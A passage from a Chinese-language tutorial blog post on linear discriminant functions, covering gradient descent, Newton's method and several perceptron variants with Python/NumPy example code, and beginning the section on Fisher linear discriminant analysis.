<p>需要注意的是，梯度下降算法仅适用于局部连续可导函数。</p>
</blockquote>
<h4 id="原理">原理</h4>
<p>对于某一个局部连续可导函数 <span class="math inline">\(f(x)\)</span>。</p>
<ol type="1">
<li>（随机）选取一个初始值 <span class="math inline">\(x_0\)</span>；</li>
<li>计算 <span class="math inline">\(f&#39;(x_0)\)</span>，如果值为负则增加 <span class="math inline">\(x_0\)</span>；如果值为正则减小 <span class="math inline">\(x_0\)</span>；</li>
<li>使 <span class="math inline">\(x_1=x_0-\eta
f&#39;(x_0)\)</span>，代入 <span class="math inline">\(x_1\)</span>
重复第二步，直到 <span class="math inline">\(|\eta
f&#39;(x_{n-1})|&lt;\theta\)</span>，<span class="math inline">\(\theta\)</span> 为临界值（误差值）。</li>
</ol>
<p>我们也称 <span class="math inline">\(\eta\)</span>
为<strong>学习率</strong>。</p>
<p>如果对于多参函数，例如二元函数 <span class="math inline">\(f(x,y)\)</span>，我们选择以某一点的梯度来增长或减小。</p>
<blockquote>
<p>因为我们是想让值快速迭代到极小值点处，而梯度是多元函数增长速度最快的方向，则负梯度是多元函数下降速度最快的方向。需要知道，<span class="math inline">\(\|\nabla J(\boldsymbol{a})\|\)</span> 表示其在
<span class="math inline">\(\boldsymbol{a}\)</span>
处的变化率的大小，当某点梯度为 <span class="math inline">\(\boldsymbol{0}\)</span> 时，该点即为 <span class="math inline">\(J(\boldsymbol{a})\)</span> 的极值点。</p>
</blockquote>
<p>即第三步的式子变为 <span class="math display">\[
x_n=x_{n-1}-\eta\nabla f(x_{n-1}, y_{n-1})\\
y_n=y_{n-1}-\eta\nabla f(x_{n-1}, y_{n-1})
\]</span> 其中 <span class="math display">\[
\nabla f(x_{n-1},y_{n-1})=\begin{bmatrix}
\frac{\partial}{\partial x}f(x_{n-1},y_{n-1})\\
\frac{\partial}{\partial y}f(x_{n-1},y_{n-1})
\end{bmatrix}
\]</span> 同理如果对于 <span class="math inline">\(J(\boldsymbol{a})\)</span>，有 <span class="math display">\[
\nabla J(\boldsymbol{a})=\begin{bmatrix}
\frac{\partial}{\partial a_1}\\
\frac{\partial}{\partial a_2}\\
\vdots\\
\frac{\partial}{\partial a_{d+1}}\\
\end{bmatrix}J(\boldsymbol{a})
\]</span>
由于其通过梯度快速下降，故称作<strong>梯度下降法</strong>。</p>
<h4 id="代码">代码</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x * x + <span class="number">2</span> * x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">df</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span> * x + <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gradient_descent</span>(<span class="params">df, init_val = <span class="number">1</span>, learning_rate = <span class="number">0.01</span>, precision = <span class="number">1e-5</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Using Gradient Descent to get local minimum</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    `Parameter`:</span></span><br><span class="line"><span class="string">        df - Derivative</span></span><br><span class="line"><span class="string">        init_val - Initial value</span></span><br><span class="line"><span class="string">        learning_rate - Learning rate</span></span><br><span class="line"><span class="string">        precision - Precision</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    `Return`</span></span><br><span class="line"><span class="string">        Local minimun</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    x = init_val</span><br><span class="line">    xs = [x]</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x = x - learning_rate * df(x)</span><br><span class="line">        xs.append(x)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">abs</span>(learning_rate * df(x)) &lt; precision:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Cost %d times calculation.&quot;</span> % <span class="built_in">len</span>(xs))</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(gradient_descent(df))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Cost 412 times calculation.</span></span><br><span class="line"><span class="string">-0.9995046101486759</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<h4 id="优劣">优劣</h4>
<p>如果 <span class="math inline">\(\eta\)</span>
过大可能会导致<strong>过冲</strong>（overshoot）甚至发散，即在极小值两边迭代无法退出循环；<span class="math inline">\(\eta\)</span>
过小会导致迭代次数过多，浪费算力。所以一般会选择较小但不是特别小的 <span class="math inline">\(\eta\)</span> 进行梯度下降。</p>
<h3 id="牛顿下降法">牛顿下降法</h3>
<p>基于梯度下降算法和牛顿迭代法进行改进，得到牛顿下降法。</p>
<h4 id="原理-1">原理</h4>
<ol type="1">
<li>（随机）选取一个初始值 <span class="math inline">\(\boldsymbol{x}_0\)</span>；</li>
<li>计算 <span class="math inline">\(\nabla f(\boldsymbol{x}_0)\)</span>
和 <span class="math inline">\(\boldsymbol{H}^{-1}\)</span>；</li>
<li>使 <span class="math inline">\(\boldsymbol{x}_1=\boldsymbol{x}_0-\boldsymbol{H}^{-1}\nabla
f(\boldsymbol{x}_0)\)</span>，代入 <span class="math inline">\(x_1\)</span> 重复第二步，直到 <span class="math inline">\(|\boldsymbol{H}^{-1}\nabla
f(\boldsymbol{x}_{n-1})|&lt;\theta\)</span>，<span class="math inline">\(\theta\)</span> 为临界值（误差值）。</li>
</ol>
<p>其中 <span class="math inline">\(H\)</span>
为<strong>海森矩阵</strong>。</p>
<h4 id="优劣-1">优劣</h4>
<p>牛顿下降法可以更快更准确的进行<strong>下降</strong>，但反过来计算
<span class="math inline">\(H\)</span>
的逆矩阵是困难的，所以一般并不会使用牛顿下降法，而是会选择小 <span class="math inline">\(\eta\)</span> 的梯度下降法。</p>
<h3 id="感知器梯度下降法">感知器梯度下降法</h3>
<p>在了解了梯度下降算法后，我们回到判别函数 <span class="math inline">\(g(\boldsymbol{y})\)</span> 的感知器准则函数 <span class="math inline">\(J_p(\boldsymbol{a})\)</span>。</p>
<p>我们由原式可得，<strong>感知器准则函数的梯度</strong>为 <span class="math display">\[
\nabla J_p=\sum_{\boldsymbol{y}\in Y_e}(-\boldsymbol{y})
\]</span> 那么我们就可以把梯度下降的公式改写为 <span class="math display">\[
\boldsymbol{a}_{n+1}=\boldsymbol{a}_{n}+\eta(n)\sum_{\boldsymbol{y}\in
Y_e}\boldsymbol{y}
\]</span> 结束条件直到 <span class="math inline">\(|\eta(n)\sum_{\boldsymbol{y}\in
Y_e}\boldsymbol{y}|&lt;\theta\)</span>。</p>
<h4 id="代码-1">代码</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Sample</span></span><br><span class="line">omega1 = [(<span class="number">4</span>, <span class="number">28</span>), (<span class="number">7</span>, <span class="number">23</span>), (<span class="number">16</span>, <span class="number">27</span>), (<span class="number">18</span>, <span class="number">30</span>), (<span class="number">2</span>, <span class="number">17</span>), (<span class="number">13</span>, <span class="number">24</span>), (<span class="number">2</span>, <span class="number">24</span>), (<span class="number">12</span>, <span class="number">29</span>), (<span class="number">2</span>, <span class="number">21</span>), (<span class="number">5</span>, <span class="number">26</span>), (<span class="number">2</span>, <span class="number">24</span>), (<span class="number">11</span>, <span class="number">18</span>), (<span class="number">8</span>, <span class="number">28</span>), (<span class="number">3</span>, <span class="number">21</span>), (<span class="number">13</span>, <span class="number">22</span>)]</span><br><span class="line">omega2 = [(<span class="number">14</span>, <span class="number">12</span>), (<span class="number">25</span>, <span class="number">28</span>), (<span class="number">8</span>, <span class="number">7</span>), (<span class="number">26</span>, <span class="number">29</span>), (<span class="number">29</span>, <span class="number">23</span>), (<span class="number">18</span>, <span class="number">1</span>), (<span class="number">19</span>, <span class="number">12</span>), (<span class="number">19</span>, <span class="number">25</span>), (<span class="number">23</span>, <span class="number">17</span>), (<span class="number">30</span>, <span class="number">2</span>), (<span class="number">18</span>, <span class="number">22</span>), (<span class="number">28</span>, <span class="number">17</span>), (<span class="number">24</span>, <span class="number">20</span>), (<span class="number">9</span>, <span class="number">4</span>), (<span class="number">25</span>, <span class="number">14</span>)]</span><br><span class="line">omega1 = np.array(omega1)</span><br><span class="line">omega2 = np.array(omega2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Plot</span></span><br><span class="line">x = omega1[:, <span class="number">0</span>]</span><br><span class="line">y = omega1[:, <span class="number">1</span>]</span><br><span class="line">plt.scatter(x, y, s=<span class="number">20</span>, c=<span class="string">&#x27;red&#x27;</span>, marker=<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">x = omega2[:, <span class="number">0</span>]</span><br><span class="line">y = omega2[:, <span class="number">1</span>]</span><br><span class="line">plt.scatter(x, y, s=<span class="number">20</span>, c=<span class="string">&#x27;green&#x27;</span>, marker=<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Augmented Vector</span></span><br><span class="line">omega1 = np.hstack((omega1, np.ones((<span class="built_in">len</span>(omega1), <span class="number">1</span>))))</span><br><span class="line">omega2 = np.hstack((omega2, np.ones((<span class="built_in">len</span>(omega1), <span class="number">1</span>))))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Normalization</span></span><br><span class="line">omega2 = -omega2</span><br><span class="line">samples = np.vstack([omega1, omega2])</span><br><span class="line">sample_number = <span class="built_in">len</span>(samples)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Laerning Rate</span></span><br><span class="line">eta = <span class="number">0.01</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Criterion Function</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Jp</span>(<span class="params">a, ys</span>):</span><br><span class="line">    rst = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> ys:</span><br><span class="line">        <span class="keyword">if</span> np.dot(a, y) &lt; <span class="number">0</span>:</span><br><span class="line">            rst += -np.dot(a, y)</span><br><span class="line">    <span class="keyword">return</span> rst</span><br><span class="line"></span><br><span class="line"><span class="comment"># Gradient of Criterion Function</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nablaJp</span>(<span class="params">a, ys</span>):</span><br><span class="line">    rst = np.zeros(ys.shape[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> ys:</span><br><span class="line">        <span class="keyword">if</span> np.dot(a, y) &lt; <span class="number">0</span>:</span><br><span class="line">            rst += -y</span><br><span class="line">    <span class="keyword">return</span> rst</span><br><span class="line"></span><br><span class="line"><span class="comment"># Perceptron Gradient Descent</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">perceptron</span>(<span class="params">samples, eta, theta = <span class="number">0.001</span></span>):</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    a = np.ones(samples.shape[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        nabla = nablaJp(a, samples)</span><br><span class="line">        <span class="keyword">if</span> np.linalg.norm(eta * nabla) &lt; theta:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        a = a - eta * nabla</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Perceptron cost %d times iterate.&quot;</span> % count)</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="comment"># Solve Weight Vector</span></span><br><span class="line">a = perceptron(samples, eta)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Turn to Feature Space</span></span><br><span class="line">xs = []</span><br><span class="line">ys = []</span><br><span class="line">xs += [<span class="number">0</span>, <span class="number">20</span>]</span><br><span class="line">ys += [(xs[<span class="number">0</span>] * a[<span class="number">0</span>] + a[<span class="number">2</span>]) / -a[<span class="number">1</span>], (xs[<span class="number">1</span>] * a[<span class="number">0</span>] + a[<span class="number">2</span>]) / -a[<span class="number">1</span>]]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Plot Judgment Boundary</span></span><br><span class="line">plt.plot(xs, ys)</span><br><span class="line"><span class="built_in">print</span>(Jp(a, samples))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Perceptron cost 7 times iterate.</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<p>对于这组样本，仅需 7 次迭代即求得解向量。</p>
<figure>
<img src="/linear-discriminant-function/二维二类权空间的感知器梯度下降.png" alt="二维二类权空间的感知器梯度下降">
<figcaption aria-hidden="true">二维二类权空间的感知器梯度下降</figcaption>
</figure>
<h3 id="固定增量法">固定增量法</h3>
<p>感知器梯度下降法需要<strong>一次获取所有学习样本</strong>，并在迭代算法中一次遍历所有样本。</p>
<p>但实际应用中，有时样本是<strong>分批获取</strong>的，先训练一部分样本，再训练一部分样本。</p>
<p>固定增量法就是根据以上需求改变的感知器算法，基本思想是每次修改解向量时，不遍历所有样本，而是将学习样本串行输入，<strong>每考察一个样本就对解向量
<span class="math inline">\(a\)</span> 进行一次修改</strong>。</p>
<p>即迭代公式为 <span class="math display">\[
\boldsymbol{a}_{n+1}=\boldsymbol{a}_{n}+\eta(n)\boldsymbol{y},\boldsymbol{y}\in
Y_e
\]</span> 结束条件直到 <span class="math inline">\(|\boldsymbol{a}_{n+1}-\boldsymbol{a}_{n}|&lt;\theta\)</span>。</p>
<p>这样做到了每当解向量分类错误时，就修改解向量，在算法时间复杂度不变的情况下，提升了解向量迭代的效率。</p>
<h4 id="代码-2">代码</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Sample</span></span><br><span class="line">omega1 = [(<span class="number">4</span>, <span class="number">28</span>), (<span class="number">7</span>, <span class="number">23</span>), (<span class="number">16</span>, <span class="number">27</span>), (<span class="number">18</span>, <span class="number">30</span>), (<span class="number">2</span>, <span class="number">17</span>), (<span class="number">13</span>, <span class="number">24</span>), (<span class="number">2</span>, <span class="number">24</span>), (<span class="number">12</span>, <span class="number">29</span>), (<span class="number">2</span>, <span class="number">21</span>), (<span class="number">5</span>, <span class="number">26</span>), (<span class="number">2</span>, <span class="number">24</span>), (<span class="number">11</span>, <span class="number">18</span>), (<span class="number">8</span>, <span class="number">28</span>), (<span class="number">3</span>, <span class="number">21</span>), (<span class="number">13</span>, <span class="number">22</span>)]</span><br><span class="line">omega2 = [(<span class="number">14</span>, <span class="number">12</span>), (<span class="number">25</span>, <span class="number">28</span>), (<span class="number">8</span>, <span class="number">7</span>), (<span class="number">26</span>, <span class="number">29</span>), (<span class="number">29</span>, <span class="number">23</span>), (<span class="number">18</span>, <span class="number">1</span>), (<span class="number">19</span>, <span class="number">12</span>), (<span class="number">19</span>, <span class="number">25</span>), (<span class="number">23</span>, <span class="number">17</span>), (<span class="number">30</span>, <span class="number">2</span>), (<span class="number">18</span>, <span class="number">22</span>), (<span class="number">28</span>, <span class="number">17</span>), (<span class="number">24</span>, <span class="number">20</span>), (<span class="number">9</span>, <span class="number">4</span>), (<span class="number">25</span>, <span class="number">14</span>)]</span><br><span class="line">omega1 = np.array(omega1)</span><br><span class="line">omega2 = np.array(omega2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Plot</span></span><br><span class="line">x = omega1[:, <span class="number">0</span>]</span><br><span class="line">y = omega1[:, <span class="number">1</span>]</span><br><span class="line">plt.scatter(x, y, s=<span class="number">20</span>, c=<span class="string">&#x27;red&#x27;</span>, marker=<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">x = omega2[:, <span class="number">0</span>]</span><br><span class="line">y = omega2[:, <span class="number">1</span>]</span><br><span class="line">plt.scatter(x, y, s=<span class="number">20</span>, c=<span class="string">&#x27;green&#x27;</span>, marker=<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Augmented Vector</span></span><br><span class="line">omega1 = np.hstack((omega1, np.ones((<span class="built_in">len</span>(omega1), <span class="number">1</span>))))</span><br><span class="line">omega2 = np.hstack((omega2, np.ones((<span class="built_in">len</span>(omega1), <span class="number">1</span>))))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Normalization</span></span><br><span class="line">omega2 = -omega2</span><br><span class="line">samples = np.vstack([omega1, omega2])</span><br><span class="line">sample_number = <span class="built_in">len</span>(samples)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Laerning Rate</span></span><br><span class="line">eta = <span class="number">0.01</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Criterion Function</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Jp</span>(<span class="params">a, ys</span>):</span><br><span class="line">    rst = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> ys:</span><br><span class="line">        <span class="keyword">if</span> np.dot(a, y) &lt; <span class="number">0</span>:</span><br><span class="line">            rst += -np.dot(a, y)</span><br><span class="line">    <span class="keyword">return</span> rst</span><br><span class="line"></span><br><span class="line"><span class="comment"># Perceptron Gradient Descent</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">perceptron</span>(<span class="params">samples, eta, theta = <span class="number">0.001</span></span>):</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    a = np.ones(samples.shape[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        ap = a</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> samples:</span><br><span class="line">            <span class="keyword">if</span> np.dot(a, y) &lt; <span class="number">0</span>:</span><br><span class="line">                a = a + eta * y</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> np.linalg.norm(a - ap) &lt; theta:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Perceptron cost %d times iterate.&quot;</span> % count)</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="comment"># Solve Weight Vector</span></span><br><span class="line">a = perceptron(samples, eta)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Turn to Feature Space</span></span><br><span class="line">xs = []</span><br><span class="line">ys = []</span><br><span class="line">xs += [<span class="number">0</span>, <span class="number">20</span>]</span><br><span class="line">ys += [(xs[<span class="number">0</span>] * a[<span class="number">0</span>] + a[<span class="number">2</span>]) / -a[<span class="number">1</span>], (xs[<span class="number">1</span>] * a[<span class="number">0</span>] + a[<span class="number">2</span>]) / -a[<span class="number">1</span>]]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Plot Judgment Boundary</span></span><br><span class="line">plt.plot(xs, ys)</span><br><span class="line"><span class="built_in">print</span>(Jp(a, samples))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Perceptron cost 5 times iterate.</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<p>对于这组样本，仅需 5 次迭代即求得解向量。</p>
<figure>
<img src="/linear-discriminant-function/二维二类权空间的固定增量法.png" alt="二维二类权空间的固定增量法">
<figcaption aria-hidden="true">二维二类权空间的固定增量法</figcaption>
</figure>
<p>当样本数量增多时，固定增量法的效率优化会更明显。</p>
<p>但固定增量法需要样本满足二类可分条件，否则无法退出迭代。</p>
<p><strong>感知器算法收敛定理：如果训练样本是线性可分的，固定增量法给出的权向量序列必定终止于某个解向量。</strong></p>
<h3 id="变增量梯度算法">变增量梯度算法</h3>
<p>单一的 <span class="math inline">\(\eta\)</span>
会导致效率一定，这个时候就会想使得 <span class="math inline">\(\eta\)</span> 会随着迭代次数的增加而变化，即 <span class="math display">\[
\eta\to\eta(n)
\]</span> 我们可以证明得到，当对于所有 <span class="math inline">\(n\)</span> 有 <span class="math display">\[
\eta(n)\geq 0\\
\lim_{m\to\infty}\sum^m_{n=1}\eta(n)=\infty\\
\lim_{m\to\infty}\frac{\sum^m_{n=1}\eta^2(n)}{(\sum^m_{n=1}\eta(n))^2}=0
\]</span> 即正项级数 <span class="math inline">\(\eta(n)\)</span>
发散，但满足一定条件，那么我们可以证明其迭代算法 <span class="math display">\[
\boldsymbol{a}_{n+1}=\boldsymbol{a}_{n}+\eta(n)\boldsymbol{y}
\]</span> 是一定收敛的。</p>
<blockquote>
<p>这也就是为什么在之前的公式中的学习率都以 <span class="math inline">\(\eta(n)\)</span> 表示。</p>
</blockquote>
<h3 id="带裕量的感知器算法">带裕量的感知器算法</h3>
<p>我们知道，解向量可以有无数多种，解区域也是有边界的，有的时候我们并不想让结果解向量太靠近边界，这样会使得分类严格。</p>
<p>根据固定增量法进行改进，我们加入裕量（margin）来均衡解向量的结果，使得迭代算法变为：</p>
<p>当 <span class="math inline">\(\boldsymbol{a}^T\boldsymbol{y}_i\leq
b\)</span> 时，我们就修改解向量 <span class="math display">\[
\boldsymbol{a}_{n+1}=\boldsymbol{a}_{n}+\eta(n)\boldsymbol{y}
\]</span></p>
<h4 id="代码-3">代码</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Sample</span></span><br><span class="line">omega1 = [(<span class="number">4</span>, <span class="number">28</span>), (<span class="number">7</span>, <span class="number">23</span>), (<span class="number">16</span>, <span class="number">27</span>), (<span class="number">18</span>, <span class="number">30</span>), (<span class="number">2</span>, <span class="number">17</span>), (<span class="number">13</span>, <span class="number">24</span>), (<span class="number">2</span>, <span class="number">24</span>), (<span class="number">12</span>, <span class="number">29</span>), (<span class="number">2</span>, <span class="number">21</span>), (<span class="number">5</span>, <span class="number">26</span>), (<span class="number">2</span>, <span class="number">24</span>), (<span class="number">11</span>, <span class="number">18</span>), (<span class="number">8</span>, <span class="number">28</span>), (<span class="number">3</span>, <span class="number">21</span>), (<span class="number">13</span>, <span class="number">22</span>)]</span><br><span class="line">omega2 = [(<span class="number">14</span>, <span class="number">12</span>), (<span class="number">25</span>, <span class="number">28</span>), (<span class="number">8</span>, <span class="number">7</span>), (<span class="number">26</span>, <span class="number">29</span>), (<span class="number">29</span>, <span class="number">23</span>), (<span class="number">18</span>, <span class="number">1</span>), (<span class="number">19</span>, <span class="number">12</span>), (<span class="number">19</span>, <span class="number">25</span>), (<span class="number">23</span>, <span class="number">17</span>), (<span class="number">30</span>, <span class="number">2</span>), (<span class="number">18</span>, <span class="number">22</span>), (<span class="number">28</span>, <span class="number">17</span>), (<span class="number">24</span>, <span class="number">20</span>), (<span class="number">9</span>, <span class="number">4</span>), (<span class="number">25</span>, <span class="number">14</span>)]</span><br><span class="line">omega1 = np.array(omega1)</span><br><span class="line">omega2 = np.array(omega2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Plot</span></span><br><span class="line">x = omega1[:, <span class="number">0</span>]</span><br><span class="line">y = omega1[:, <span class="number">1</span>]</span><br><span class="line">plt.scatter(x, y, s=<span class="number">20</span>, c=<span class="string">&#x27;red&#x27;</span>, marker=<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">x = omega2[:, <span class="number">0</span>]</span><br><span class="line">y = omega2[:, <span class="number">1</span>]</span><br><span class="line">plt.scatter(x, y, s=<span class="number">20</span>, c=<span class="string">&#x27;green&#x27;</span>, marker=<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Augmented Vector</span></span><br><span class="line">omega1 = np.hstack((omega1, np.ones((<span class="built_in">len</span>(omega1), <span class="number">1</span>))))</span><br><span class="line">omega2 = np.hstack((omega2, np.ones((<span class="built_in">len</span>(omega1), <span class="number">1</span>))))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Normalization</span></span><br><span class="line">omega2 = -omega2</span><br><span class="line">samples = np.vstack([omega1, omega2])</span><br><span class="line">sample_number = <span class="built_in">len</span>(samples)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Laerning Rate</span></span><br><span class="line">eta = <span class="number">0.01</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Criterion Function</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Jp</span>(<span class="params">a, ys</span>):</span><br><span class="line">    rst = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> ys:</span><br><span class="line">        <span class="keyword">if</span> np.dot(a, y) &lt; <span class="number">0</span>:</span><br><span class="line">            rst += -np.dot(a, y)</span><br><span class="line">    <span class="keyword">return</span> rst</span><br><span class="line"></span><br><span class="line"><span class="comment"># Perceptron Gradient Descent</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">perceptron</span>(<span class="params">samples, eta, theta = <span class="number">0.001</span>, b = <span class="number">0</span></span>):</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    a = np.ones(samples.shape[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        ap = a</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> samples:</span><br><span class="line">            <span class="keyword">if</span> np.dot(a, y) &lt; b:</span><br><span class="line">                a = a + eta * y</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> np.linalg.norm(a - ap) &lt; theta:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Perceptron cost %d times iterate.&quot;</span> % count)</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="comment"># Solve Weight Vector</span></span><br><span class="line">a = perceptron(samples, eta, b = <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Turn to Feature Space</span></span><br><span class="line">xs = []</span><br><span class="line">ys = []</span><br><span class="line">xs += [<span class="number">0</span>, <span class="number">20</span>]</span><br><span class="line">ys += [(xs[<span class="number">0</span>] * a[<span class="number">0</span>] + a[<span class="number">2</span>]) / -a[<span class="number">1</span>], (xs[<span class="number">1</span>] * a[<span class="number">0</span>] + a[<span class="number">2</span>]) / -a[<span class="number">1</span>]]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Plot Judgment Boundary</span></span><br><span class="line">plt.plot(xs, ys)</span><br><span class="line"><span class="built_in">print</span>(Jp(a, samples))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Perceptron cost 7 times iterate.</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<p>对于这组样本，需 7 次迭代求得解向量。</p>
<p>不难看出，带裕量的感知器算法会使得迭代次数变多，但这是可以控制的，远低于原始的感知器梯度下降法的迭代次数。</p>
<p>同时我们通过添加裕量 <span class="math inline">\(b=1\)</span>，使得判决边界更加趋近于解空间的中间。</p>
<figure>
<img src="/linear-discriminant-function/二维二类权空间的带裕量的固定增量法.png" alt="二维二类权空间的带裕量的固定增量法">
<figcaption aria-hidden="true">二维二类权空间的带裕量的固定增量法</figcaption>
</figure>
<h2 id="fisher-线性判别">Fisher 线性判别</h2>
<h3 id="原理-2">原理</h3>
<p>我们知道上面线性判别的方式是增加维度的，这样可以精确的描述一个线性判别函数；同时特征空间的纬度越高，判别的精确度就越高。</p>
<p>但这与此同时也带来一个灾难性的问题，就是高纬度的计算总是复杂和苦难的，因此
Fisher 研究的是降维领域。</p>
<p>由判别函数的式子可知 <span class="math display">\[
g(\boldsymbol{x})=\boldsymbol{w}^T\boldsymbol{x}
\]</span>
可以理解为特征向量在权向量上的投影，如果说我们对所有的特征向量都做一次投影，应该是下图所示</p>
<figure>
<img src="/linear-discriminant-function/各向量对权向量的投影.png" alt="各向量对权向量的投影">
<figcaption aria-hidden="true">各向量对权向量的投影</figcaption>
</figure>
<p>可以很自然的发现，我们将二维的权空间转化到了一维上，此时我们只考虑投影值的大小，而非特征向量的空间分布。</p>
<p>如果说把其转化为一维可视图像，正如图所示</p>
<figure>
<img src="/linear-discriminant-function/Fisher准则一维化.png" alt="Fisher准则一维化">
<figcaption aria-hidden="true">Fisher准则一维化</figcaption>
</figure>
<p>很显然，我们发现不同的权向量会导致一维图像上有不同的结果，左图的权向量显然错分数更多，映射到一维图像上就是有所重合；有图的权向量显然错分数更少，映射到一维图像上就是类间数据有所分离。</p>
<p>自然的，我们会认为，最好的分类是将类间数据进行分离，而类内数据进行聚合，使得两类分离，这就是
Fisher 判别准则。</p>
<p><strong>LDA
基本原理：投影后具有最佳可分离性，即最大的类间距离和最小的类内距离。</strong></p>
<p>我们定义类内距离以投影均值表示，类间距离以投影方差表示，那么想要同时优化两个目标，即想让样本均值之差大，样本方差尽量小，那么定义准则函数
<span class="math display">\[
J(\boldsymbol{w})=\frac{|\tilde{m}_1-\tilde{m}_2|}{\tilde{s}_1^2+\tilde{s}_2^2}
\]</span> 那么有样本均值 <span class="math display">\[
